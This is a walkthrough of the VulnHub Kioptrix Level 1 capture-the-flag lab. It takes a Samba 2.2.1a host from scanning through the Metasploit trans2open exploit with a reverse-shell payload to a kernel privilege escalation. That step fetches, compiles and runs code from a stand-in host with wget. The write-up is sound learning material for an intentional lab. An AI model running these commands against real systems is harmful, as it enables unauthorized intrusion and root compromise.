# 🧠 Kioptrix Level 1 – VulnHub CTF Walkthrough

**Author:** Shah Zaman  
**Platform:** VulnHub  
**Difficulty:** Beginner → Intermediate  
**Target IP:** `192.168.56.102`  
**Attacker:** Kali Linux  
**Objective:** Get root and capture the flag  
**Tools Used:** Netdiscover, Nmap, Nikto, Enum4linux, Metasploit, Searchsploit

---

## 📌 Table of Contents

1. [Information Gathering](#information-gathering)
2. [Scanning & Enumeration](#scanning--enumeration)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Exploitation](#exploitation)
5. [Post Exploitation & Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flag Capture](#flag-capture)
7. [Lessons Learned](#lessons-learned)

---

## 🔎 Information Gathering

### 🔹 Step 1: Identify the Target IP
```bash
netdiscover -r 192.168.56.0/24
```
**Output:**
192.168.56.102 – Target Machine


## 🧪 Scanning & Enumeration

### 🔹Step 2: Nmap Scan for Open Ports
```bash
nmap -sC -sV -A -oN nmap.txt 192.168.56.102
```
**Output:**
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp  open  http        Apache httpd 1.3.20
111/tcp open  rpcbind     2 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache/1.3.20 (Unix) OpenSSL/0.9.6b
```


## 🔹 Step 3: Web Enumeration with Nikto
```bash
nikto -h http://192.168.56.102
```
**Output:**
+ Server: Apache/1.3.20 (Unix)
+ Retrieved x-powered-by header: PHP/4.1.2
+ /test.php: PHP file found
+ /phpinfo.php: PHP info file detected


## 🔹 Step 4: SMB Enumeration with Enum4linux
```bash
enum4linux -a 192.168.56.102
```
**Output:**
OS: Unix
Samba version: 2.2.1a
Workgroup: WORKGROUP



---

# 🔍Vulnerability Analysis

## SMB Version Detection (Recon)
```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.102
run
```
**Output:**
Host: 192.168.56.102
OS: Unix
Samba Version: 2.2.1a

 ## 🔹Search Exploits using Searchsploit
 ```bash
searchsploit samba 2.2.1a
 ```
**Output:**
Samba 2.2.1a - Trans2open Overflow → exploit/linux/samba/trans2open

✅ Vulnerability confirmed!

---

# 4. 💥 Exploitation

## 🔹 Exploit Trans2open via Metasploit
```bash
use exploit/linux/samba/trans2open
set RHOST 192.168.56.102
set LHOST <your-Kali-IP>
set PAYLOAD linux/x86/shell_reverse_tcp
run
```
**Output:**
[*] Started reverse TCP handler
[*] Command shell session opened: 192.168.56.102 → 192.168.56.1

✅ Got reverse shell!

---

# 5. 🔐 Privilege Escalation

## 🔹 Upgrade Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
## 🔹 Check SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
## 🔹 Check Kernel
```bash
uname -a
```
**Output:**
Linux kioptrix 2.4.7-10 #1 i686 unknown

✅ Vulnerable to several known exploits!

## Search for Local Privesc:
```bash
searchsploit linux 2.4
```
## Use exploit :
```bash
cd /tmp
wget http://example.com/priv_esc_exploit.c
gcc priv_esc_exploit.c -o exploit
chmod +x exploit
./exploit
```

---

# 6. 🏁 Flag Capture

## 🔹 Check Root Access
```bash
whoami
```
**Output:**
root

## 🔹 Capture the Flag
```bash
cat /root/flag.txt
```
**Or:**
```bash
cd /var/mail
cat root
```
**🎉 Root access achieved, flag captured!**

---

# 7. 📚 Summary & Lessons Learned
✅ SMB enumeration is critical; Samba 2.2.1a is exploitable via Trans2open
✅ Used Metasploit for remote shell access
✅ Privilege escalation via local kernel exploit (2.4.7-10)
✅ Full system compromise achieved

---

## 🔗 References

- [Kioptrix Level 1 VulnHub Walkthrough – InfosecWriteups](https://infosecwriteups.com/kioptrix-level-1-vulnhub-walkthrough-49bcc7306e72)  
- [Kioptrix Level 1 VulnHub Walkthrough – Mark de Moras (Medium)](https://medium.com/@MarkdeMoras/kioptrix-level-1-1-vulnhub-walkthrough-by-mark-de-moras-147002cc4853)  
- [VulnHub Official Entry: Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

📘 Walkthrough created for learning and documentation. Feedback is welcome.
